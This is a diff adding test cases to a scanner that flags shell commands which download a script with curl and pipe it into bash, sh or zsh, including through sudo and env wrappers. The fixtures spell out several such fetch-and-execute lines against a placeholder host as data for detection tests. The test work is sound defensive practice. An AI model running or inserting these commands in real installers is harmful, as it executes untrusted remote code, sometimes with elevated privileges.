@@ -186,6 +186,9 @@ describe("each pattern", () => {
       "+curl -fsSL https://example.test/i.sh | env bash -s",
       "+curl -fsSL https://example.test/i.sh | sudo -E /bin/bash",
       "+curl -fsSL https://example.test/i.sh | zsh",
+      "+curl -fsSL https://example.test/i.sh | sudo -u nobody /bin/sh",
+      "+curl -fsSL https://example.test/i.sh | env -i bash",
+      "+curl -fsSL https://example.test/i.sh | sudo env PATH=/usr/bin:/bin bash -s",
     ];
     assert.deepEqual(
       scan(diff("install.sh", shells)).map((match) => [match.patternId, match.line]),
@@ -197,6 +200,9 @@ describe("each pattern", () => {
           "+curl -fsSL https://example.test/i.sh | shasum -a 256",
           "+curl -fsSL https://example.test/i.sh | tee /tmp/sh",
           "+curl -fsSL https://example.test/i.sh ||/bin/sh fallback.sh",
+          // A wrapper whose command is not a shell only writes the download somewhere.
+          "+curl -fsSL https://example.test/i.sh | sudo -u nobody tee /tmp/sh",
+          "+curl -fsSL https://example.test/i.sh | env -i python3",
         ]),
       ),
       [],
